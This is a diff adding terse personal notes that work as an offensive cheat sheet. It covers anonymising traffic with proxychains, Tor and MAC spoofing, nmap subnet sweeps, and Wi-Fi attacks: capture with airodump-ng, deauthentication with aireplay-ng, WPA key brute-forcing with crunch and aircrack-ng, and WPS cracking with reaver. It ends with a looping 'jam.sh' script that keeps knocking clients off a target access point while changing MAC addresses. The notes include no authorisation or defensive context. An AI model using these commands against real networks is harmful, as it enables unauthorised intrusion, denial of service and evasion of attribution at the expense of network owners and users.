@@ -1,0 +1,173 @@
+Staying Anonymous
+->change the proxychains.conf file to make it use dynamic chaining
+->add socks5 with the sam ip address as the socks4
+
+>>	nano /etc/proxychains.conf
+
+
+>>	service tor start
+>>	service tor stop
+>>	service tor restart
+>>	service tor status
+>>	proxychains firefox www.abcd.com
+(dns leak test)
+
+->proxychains is the one that makes you anonymous
+
+
+Changing DNS
+
+->get the dns provided by network manager
+
+>>	cat /etc/resolv.conf
+
+>>	nano /etc/dhcp/dhclient.conf
+
+->uncomment the prepend domain-name-servers and change it to 208.67.222.222, 208.67.220.220, 8.8.8.8
+
+>>	service network-manager restart	
+
+
+VPN
+
+>>	openvpn vpnbook-.......
+
+
+Changing MAC Address
+
+>>	macchanger -s eth0
+>>	macchanger -r eth0 (random MAC address / kills internet connection)
+>>	macchanger -p eth0(restore MAC)
+
+
+
+nmap
+
+>>	nmap website(scanme.nmap.org) -vv
+
+>>	nmap -oG - 192.168.1.0-255 (-p 22)* -vv > /home/SCAN
+>>	CAT SCAN
+>>	LESS SCAN
+
+>>	CAT SCAN | grep Up (filtering....)
+>>	CAT SCAN | grep Up | awk -F " " '{print $2}' > SCAN2
+-> -F field delimeter on space " "
+-> $2 second parameter
+-> write to SCAN2
+
+>>	nmap -iL SCAN2 -vv 
+
+
+
+footprinting
+
+->major ip blocks(nirsoft...)
+->who is ip address(lookup.net)
+
+
+>>	nslookup scanme.nmap.org
+>>	nslookup 45.33.32.156(dns)
+
+
+assign physical location to ip address
+
+>>	curl ipinfo.io/74.207.244.221(ip)
+
+
+
+airodump-ng
+->collect information
+
+aircrack-ng
+->brute force the encryption key
+
+
+crunch
+
+>>	crunch 3 9 abc123 |aircrack-ng
+
+
+
+
+cracking(promiscuous mode and monitor mode)
+
+->Enabling monitor mode(script)
+
+>>	ifconfig wlan0 down
+>>	iwconfig wlan0 mode monitor
+>>	ifconfig wlan0 up
+
+
+->Checking for interference
+
+>>	airmon-ng check wlan0
+
+->Killing the interferences
+
+>>	kill 1312(NetworkManager)
+>>	kill 17917(dhcp)
+>>	kill 123 233 ... (kill all process)
+
+
+Aircrack 
+
+->Scanning the network
+
+>>	airodump-ng wlan0
+
+BSSID => MAC Address
+PWR => Strength
+
+->Precise scan 
+
+>>	airodump-ng -c channel -w SCAN_test(filename) --bssid BSSID wlan0	
+
+>>	aireplay-ng -0 0(time of deauthentication) -a BSSID wlan0
+
+>>	crunch 8 8  | aircrack-ng -w - SCAN_test-01.cap -e Moneky D' Luffy	
+
+
+
+Reaver
+
+>>	wash -i wlan0
+
+>>	reaver -b BSSID -i wlan0 -c channel -r 2:60 -vv
+
+
+Changing the channel
+
+>>	iwconfig wlan0 channel channel()
+
+
+DOS
+
+>>	airmon-ng check wlan0
+>>	airodump-ng wlan0
+>>	aireplay-ng -0 0 -a BSSID wlan0 (deauth)
+>>	airodump-ng --bssid BSSID wlan0
+
+bash script??
+
+
+Jamming 
+(jam.sh script)
+
+
+#!/bin/bash
+
+while true
+do
+	aireplay-ng -0 5 -a BSSID wlan0
+	ifconfig wlan0 down
+	macchanger -r wlan0 | grep "New MAC"
+	iwconfig wlan0 mode monitor
+	ifconfig wlan0 up
+	iwconfig wlan0 | grep Mode
+	sleep 3
+	echo Waiting!!!!!
+done
+
+>>	chmod +x jam.sh (executable) ./jam.sh12:52 PM 9/29/2016
+
+>>	airodump-ng --bssid BSSID --channel cha.. wlan0
